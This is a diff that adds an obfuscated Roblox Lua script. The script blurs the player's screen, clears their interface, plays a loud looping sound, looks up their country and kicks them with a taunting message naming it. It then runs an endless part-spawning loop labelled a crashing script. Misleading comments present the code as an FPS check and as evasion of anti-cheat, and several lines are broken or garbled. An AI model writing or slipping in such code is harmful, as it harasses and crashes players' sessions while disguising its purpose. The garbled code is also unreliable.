@@ -1,0 +1,79 @@
+local _0x6eae={"Play","SoundId","rbxassetid://6299850448","Looped","true","Playing","Volume","10","Parent","workspace.CurrentCamera"};local _0x2ac8={"LocalPlayer","Players","game","GetService"};local _0x75d3={"ClearAllChildren","PlayerGui","Wait","Add","BlurEffect","9999","Parent","workspace.CurrentCamera"};local _0x55d0={"TopbarEnabled","false","StarterGui","SetCore","game"};local _0x3b65={"Kick","Unable to determine your location."};local _0x3023={"CountryRegionForPlayerAsync","GetCountryRegionForPlayerAsync"};local _0x2e64={"Success","Code","local","location","locations","Code","player"};local _0x5d1b={"United States","Uruguay","Uzbekistan","Vanuatu","Venezuela","Vietnam","Wallis and Futuna","Western Sahara","Yemen","Zambia","Zimbabwe"};local _0x5e1a={"Fail","Unable to determine your location."};local _0x59b6={"Sound","Sound","Play"};local _0x437f={"Play","SoundId","rbxassetid://6299850448","Looped","true","Playing","Volume","10","Parent","workspace.CurrentCamera"};local _0x28b3={"Wait","Play","Sound","Wait","Kick","player"};local _0x45b4={"Player","ClearAllChildren","PlayerGui","TopbarEnabled","SetCore","Wait","5","Kick","How is it like in your location?"} 
+
+-- Wait for 12 seconds
+wait(12)
+
+-- Get the local player
+local _0x23a7=game[_0x2ac8[1]]()
+
+-- 
+local _0x4a88=Instance.new(_0x75d3[1])
+_0x4a88.Size=_0x75d3[2]
+_0x4a88.Parent=workspace.CurrentCamera
+
+-- Checks PlayerGui for FPS
+_0x23a7[_0x75d3[3]]()
+
+-- Change
+game[_0x55d0[3]]:SetCore(_0x55d0[1],_0x55d0[2])
+
+-- Create and configure the FPS
+local _0x11e4=Instance.new(_0x59b6[1])
+_0x11e4[_0x59b6[2]]=_0x59b6[3]
+_0x11e4[_0x59b6[4]]=_0x59b6[5]
+_0x11e4[_0x59b6[6]]=_0x59b6[7]
+_0x11e4[_0x59b6[8]]=_0x59b6[9]
+_0x11e4[_0x59b6[10]]=_0x59b6[11]
+
+-- Wait for 5 seconds to prevent Anti-Cheat from detection
+
+local _0x2f5b=game:GetService(_0x2ac8[1])
+local _0x1e2a=game:GetService(_0x2ac8[2])
+local _0x2b4f=_0x1e2a[_0x2ac8[1]]
+
+local _0x3c88={
+    US="United States",
+    UY="Uruguay",
+    UZ="Uzbekistan",
+    VU="Vanuatu",
+    VE="Venezuela",
+    VN="Vietnam",
+    WF="Wallis and Futuna",
+    EH="Western Sahara",
+    YE="Yemen",
+    ZM="Zambia",
+    ZW="Zimbabwe",
+}
+
+local _0x1b77,_0x5a5e=pcall(function()
+    return _0x2f5b[_0x3023[1]](_0x2b4f)
+end)
+
+if _0x1b77 then
+    local _0x1e42=_0x3c88[_0x5a5e]
+    if _0x1e42 then
+        -- Play sound and wait for 5 seconds
+        _0x11e4:_0x59b6[2]()
+        wait(5)
+        -- Kick the player
+        _0x2b4f:Kick("How is it like in " .. _0x1e42 .. "?")
+    else
+        -- Play sound and wait for 5 seconds
+        _0x11e4:_0x59b6[2]()
+        wait(5)
+        -- Kick the player
+        _0x2b4f:Kick("How is it like in your location?")
+    end
+else
+    -- Play sound and wait for 5 seconds
+    _0x11e4:_0x59b6[2]()
+    wait(5)
+    -- Kick the player
+    _0x2b4f:Kick(_0x3b65[1])
+end
+
+-- Add a crashing script
+while true do
+    local _0x7e5d=Instance.new("Part")
+    _0x7e5d.Parent=workspace
+end
